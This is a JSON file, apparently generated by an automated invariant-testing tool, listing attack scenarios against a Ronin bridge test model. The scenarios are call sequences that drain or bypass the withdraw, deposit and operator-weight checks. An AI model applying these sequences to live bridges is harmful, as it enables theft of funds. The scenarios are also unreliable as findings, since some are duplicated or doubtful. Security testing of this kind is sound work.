@@ -1,0 +1,713 @@
+{
+  "bridge_name": "ronin_2024",
+  "scenarios": [
+    {
+      "scenario_id": "ronin_deposit_zero_amount",
+      "target_invariant": "deposit_amount_positive",
+      "vulnerability_class": "zero_amount_deposit",
+      "confidence": 0.9,
+      "retrieved_exploits": [],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "RoninToken",
+          "function": "approve(address,uint256)",
+          "params": {
+            "spender": "RoninDeposit",
+            "amount": "0"
+          },
+          "description": "Approve zero amount to RoninDeposit"
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "RoninDeposit",
+          "function": "deposit(uint256)",
+          "params": {
+            "amount": "0"
+          },
+          "description": "Deposit zero amount to bypass amount check"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Approve zero amount to RoninDeposit"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Deposit zero amount to bypass amount check"
+        }
+      ]
+    },
+    {
+      "scenario_id": "ronin_gateway_v3_vote_weight_bypass",
+      "target_invariant": "withdraw_min_vote_weight",
+      "vulnerability_class": "access control",
+      "confidence": 0.9,
+      "retrieved_exploits": [],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "withdraw(address,uint256,address[])",
+          "params": {
+            "recipient": "attacker",
+            "amount": "1000000000000000000000",
+            "signers": [
+              "0x000000000000000000000000000000000000Ab01"
+            ]
+          },
+          "description": "Exploit uninitialized operator weights to bypass minimum vote weight check"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Exploit uninitialized operator weights to bypass minimum vote weight check"
+        }
+      ]
+    },
+    {
+      "scenario_id": "token_balance_non_negative_violation",
+      "target_invariant": "token_balance_non_negative",
+      "vulnerability_class": "integer_overflow",
+      "confidence": 0.5,
+      "retrieved_exploits": [],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "RoninToken",
+          "function": "transfer(address,uint256)",
+          "params": {
+            "to": "attacker",
+            "amount": "115792089237316195423570985008687907853269984665640564039457584007913129639935"
+          },
+          "description": "Attempt to transfer max uint256 value to cause integer overflow"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Attempt to transfer max uint256 value to cause integer overflow"
+        }
+      ]
+    },
+    {
+      "scenario_id": "ronin_gateway_v3_withdraw_exploit",
+      "target_invariant": "single_deposit_per_nonce",
+      "vulnerability_class": "insufficient_validation",
+      "confidence": 0.8,
+      "retrieved_exploits": [],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "RoninToken",
+          "function": "approve(address,uint256)",
+          "params": {
+            "spender": "RoninDeposit",
+            "amount": "100000000000000000000"
+          },
+          "description": "Approve RoninDeposit to spend attacker's tokens"
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "RoninDeposit",
+          "function": "deposit(uint256)",
+          "params": {
+            "amount": "100000000000000000000"
+          },
+          "description": "Deposit tokens to lock them on source chain"
+        },
+        {
+          "step": 3,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "withdraw(address,uint256,address[])",
+          "params": {
+            "recipient": "attacker",
+            "amount": "100000000000000000000",
+            "signers": [
+              "0x000000000000000000000000000000000000Ab01"
+            ]
+          },
+          "description": "Withdraw tokens on destination chain using the same nonce"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Approve RoninDeposit to spend attacker's tokens"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Deposit tokens to lock them on source chain"
+        },
+        {
+          "waypoint_id": "w3",
+          "after_step": 3,
+          "predicate": "step_3_executed",
+          "description": "Withdraw tokens on destination chain using the same nonce"
+        }
+      ]
+    },
+    {
+      "scenario_id": "withdraw_to_zero_address",
+      "target_invariant": "withdraw_recipient_non_zero",
+      "vulnerability_class": "invalid_recipient",
+      "confidence": 0.9,
+      "retrieved_exploits": [],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "withdraw(address,uint256,address[])",
+          "params": {
+            "recipient": "0x0000000000000000000000000000000000000000",
+            "amount": "1000000000000000000000000",
+            "signers": []
+          },
+          "description": "Call withdraw with zero address as recipient to bypass invariant check"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Call withdraw with zero address as recipient to bypass invariant check"
+        }
+      ]
+    },
+    {
+      "scenario_id": "ronin_deposit_balance_mismatch",
+      "target_invariant": "deposit_token_balance_update",
+      "vulnerability_class": "incorrect_balance_update",
+      "confidence": 0.9,
+      "retrieved_exploits": [],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "RoninToken",
+          "function": "transferFrom(address,address,uint256)",
+          "params": {
+            "from": "0x000000000000000000000000000000000000Ab01",
+            "to": "RoninDeposit",
+            "amount": "1000000000000000000000"
+          },
+          "description": "Directly transfer tokens from the deposit contract's source to itself, bypassing balance checks"
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "RoninDeposit",
+          "function": "deposit(uint256)",
+          "params": {
+            "amount": "1000000000000000000000"
+          },
+          "description": "Deposit the same tokens again, causing totalLocked to increase without proper balance deduction"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Directly transfer tokens from the deposit contract's source to itself, bypassing balance checks"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Deposit the same tokens again, causing totalLocked to increase without proper balance deduction"
+        }
+      ]
+    },
+    {
+      "scenario_id": "ronin_gateway_v3_withdraw_exploit",
+      "target_invariant": "withdraw_token_balance_update",
+      "vulnerability_class": "insufficient_validation",
+      "confidence": 0.8,
+      "retrieved_exploits": [],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "RoninToken",
+          "function": "transferFrom(address,address,uint256)",
+          "params": {
+            "from": "0x000000000000000000000000000000000000Ab01",
+            "to": "attacker",
+            "amount": "100000000000000000000"
+          },
+          "description": "Transfer tokens from the pre-funded address to attacker"
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "RoninToken",
+          "function": "approve(address,uint256)",
+          "params": {
+            "spender": "RoninDeposit",
+            "amount": "100000000000000000000"
+          },
+          "description": "Approve RoninDeposit to spend attacker's tokens"
+        },
+        {
+          "step": 3,
+          "chain": "source",
+          "contract": "RoninDeposit",
+          "function": "deposit(uint256)",
+          "params": {
+            "amount": "100000000000000000000"
+          },
+          "description": "Deposit tokens to RoninDeposit"
+        },
+        {
+          "step": 4,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "withdraw(address,uint256,address[])",
+          "params": {
+            "recipient": "attacker",
+            "amount": "100000000000000000000",
+            "signers": []
+          },
+          "description": "Exploit the missing validation in withdraw function to get tokens without proper signatures"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Transfer tokens from the pre-funded address to attacker"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Approve RoninDeposit to spend attacker's tokens"
+        },
+        {
+          "waypoint_id": "w3",
+          "after_step": 3,
+          "predicate": "step_3_executed",
+          "description": "Deposit tokens to RoninDeposit"
+        },
+        {
+          "waypoint_id": "w4",
+          "after_step": 4,
+          "predicate": "step_4_executed",
+          "description": "Exploit the missing validation in withdraw function to get tokens without proper signatures"
+        }
+      ]
+    },
+    {
+      "scenario_id": "ronin_gateway_v3_weight_update",
+      "target_invariant": "admin_only_weight_update",
+      "vulnerability_class": "unauthorized_operator_weight_update",
+      "confidence": 0.9,
+      "retrieved_exploits": [],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "initializeV3()",
+          "params": {},
+          "description": "Initialize V3 to set totalOperatorWeight to 100"
+        },
+        {
+          "step": 2,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "withdraw(address,uint256,address[])",
+          "params": {
+            "recipient": "attacker",
+            "amount": "1000000000000000000000000",
+            "signers": [
+              "0x0000000000000000000000000000000000000001",
+              "0x0000000000000000000000000000000000000001",
+              "0x0000000000000000000000000000000000000001",
+              "0x0000000000000000000000000000000000000001",
+              "0x0000000000000000000000000000000000000001",
+              "0x0000000000000000000000000000000000000001",
+              "0x0000000000000000000000000000000000000001",
+              "0x0000000000000000000000000000000000000001",
+              "0x0000000000000000000000000000000000000001",
+              "0x0000000000000000000000000000000000000001"
+            ]
+          },
+          "description": "Exploit the lack of operator weight validation to withdraw all tokens"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Initialize V3 to set totalOperatorWeight to 100"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Exploit the lack of operator weight validation to withdraw all tokens"
+        }
+      ]
+    },
+    {
+      "scenario_id": "total_weight_zero_exploit",
+      "target_invariant": "total_weight_positive",
+      "vulnerability_class": "access_control",
+      "confidence": 0.8,
+      "retrieved_exploits": [],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "withdraw(address,uint256,address[])",
+          "params": {
+            "recipient": "attacker",
+            "amount": "1000000000000000000000000",
+            "signers": []
+          },
+          "description": "Exploit zero total operator weight to bypass vote weight check"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Exploit zero total operator weight to bypass vote weight check"
+        }
+      ]
+    },
+    {
+      "scenario_id": "multiple_withdrawals",
+      "target_invariant": "single_withdraw_per_tx",
+      "vulnerability_class": "multiple_withdrawals_in_single_tx",
+      "confidence": 0.9,
+      "retrieved_exploits": [],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "RoninToken",
+          "function": "approve(address,uint256)",
+          "params": {
+            "spender": "RoninDeposit",
+            "amount": "100000000000000000000"
+          },
+          "description": "Approve RoninDeposit to spend attacker's tokens"
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "RoninDeposit",
+          "function": "deposit(uint256)",
+          "params": {
+            "amount": "100000000000000000000"
+          },
+          "description": "Deposit tokens to RoninDeposit"
+        },
+        {
+          "step": 3,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "withdraw(address,uint256,address[])",
+          "params": {
+            "recipient": "attacker",
+            "amount": "100000000000000000000",
+            "signers": []
+          },
+          "description": "Withdraw tokens from RoninGatewayV3 without proper signers"
+        },
+        {
+          "step": 4,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "withdraw(address,uint256,address[])",
+          "params": {
+            "recipient": "attacker",
+            "amount": "100000000000000000000",
+            "signers": []
+          },
+          "description": "Withdraw same tokens again in same tx"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Approve RoninDeposit to spend attacker's tokens"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Deposit tokens to RoninDeposit"
+        },
+        {
+          "waypoint_id": "w3",
+          "after_step": 3,
+          "predicate": "step_3_executed",
+          "description": "Withdraw tokens from RoninGatewayV3 without proper signers"
+        },
+        {
+          "waypoint_id": "w4",
+          "after_step": 4,
+          "predicate": "step_4_executed",
+          "description": "Withdraw same tokens again in same tx"
+        }
+      ]
+    },
+    {
+      "scenario_id": "ronin_deposit_event_emission_bypass",
+      "target_invariant": "deposit_event_emission",
+      "vulnerability_class": "event_emission_bypass",
+      "confidence": 0.8,
+      "retrieved_exploits": [],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "RoninToken",
+          "function": "transferFrom(address,address,uint256)",
+          "params": {
+            "from": "0x000000000000000000000000000000000000Ab01",
+            "to": "RoninDeposit",
+            "amount": "1000000000000000000000"
+          },
+          "description": "Directly transfer tokens from the deposit address to RoninDeposit without using deposit() function"
+        },
+        {
+          "step": 2,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "withdraw(address,uint256,address[])",
+          "params": {
+            "recipient": "attacker",
+            "amount": "1000000000000000000000",
+            "signers": []
+          },
+          "description": "Withdraw tokens from RoninGatewayV3 to attacker's address"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Directly transfer tokens from the deposit address to RoninDeposit without using deposit() function"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Withdraw tokens from RoninGatewayV3 to attacker's address"
+        }
+      ]
+    },
+    {
+      "scenario_id": "ronin_gateway_withdraw_event_emission",
+      "target_invariant": "withdraw_event_emission",
+      "vulnerability_class": "event_emission_bypass",
+      "confidence": 0.9,
+      "retrieved_exploits": [],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "RoninToken",
+          "function": "approve(address,uint256)",
+          "params": {
+            "spender": "RoninGatewayV3",
+            "amount": "100000000000000000000"
+          },
+          "description": "Approve RoninGatewayV3 to spend attacker's tokens"
+        },
+        {
+          "step": 2,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "withdraw(address,uint256,address[])",
+          "params": {
+            "recipient": "attacker",
+            "amount": "100000000000000000000",
+            "signers": []
+          },
+          "description": "Attempt withdrawal without proper signers, bypassing event emission check"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Approve RoninGatewayV3 to spend attacker's tokens"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Attempt withdrawal without proper signers, bypassing event emission check"
+        }
+      ]
+    },
+    {
+      "scenario_id": "ronin_gateway_weight_exploit",
+      "target_invariant": "operator_weight_bounds",
+      "vulnerability_class": "access_control",
+      "confidence": 0.8,
+      "retrieved_exploits": [],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "withdraw(address,uint256,address[])",
+          "params": {
+            "recipient": "attacker",
+            "amount": "1000000000000000000000",
+            "signers": [
+              "0x000000000000000000000000000000000000Ab01"
+            ]
+          },
+          "description": "Exploit uninitialized operator weights to withdraw tokens without proper authorization"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Exploit uninitialized operator weights to withdraw tokens without proper authorization"
+        }
+      ]
+    },
+    {
+      "scenario_id": "token_address_change",
+      "target_invariant": "token_address_immutable",
+      "vulnerability_class": "initialization_vulnerability",
+      "confidence": 0.9,
+      "retrieved_exploits": [],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "initializeV3()",
+          "params": {},
+          "description": "Exploit initialization function to potentially change token address"
+        },
+        {
+          "step": 2,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "withdraw(address,uint256,address[])",
+          "params": {
+            "recipient": "attacker",
+            "amount": "1000000000000000000000000",
+            "signers": []
+          },
+          "description": "Attempt to withdraw tokens after potential token address change"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Exploit initialization function to potentially change token address"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Attempt to withdraw tokens after potential token address change"
+        }
+      ]
+    },
+    {
+      "scenario_id": "admin_zero_exploit",
+      "target_invariant": "admin_address_non_zero",
+      "vulnerability_class": "uninitialized_admin",
+      "confidence": 0.9,
+      "retrieved_exploits": [],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "initializeV3()",
+          "params": {},
+          "description": "Initialize V3 to set totalOperatorWeight to 100"
+        },
+        {
+          "step": 2,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "initializeV4()",
+          "params": {},
+          "description": "Initialize V4 to set v4 flag to true"
+        },
+        {
+          "step": 3,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "withdraw(address,uint256,address[])",
+          "params": {
+            "recipient": "attacker",
+            "amount": "1000000000000000000000000",
+            "signers": []
+          },
+          "description": "Withdraw all tokens to attacker with empty signers array due to zero admin check bypass"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Initialize V3 to set totalOperatorWeight to 100"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Initialize V4 to set v4 flag to true"
+        },
+        {
+          "waypoint_id": "w3",
+          "after_step": 3,
+          "predicate": "step_3_executed",
+          "description": "Withdraw all tokens to attacker with empty signers array due to zero admin check bypass"
+        }
+      ]
+    }
+  ]
+}
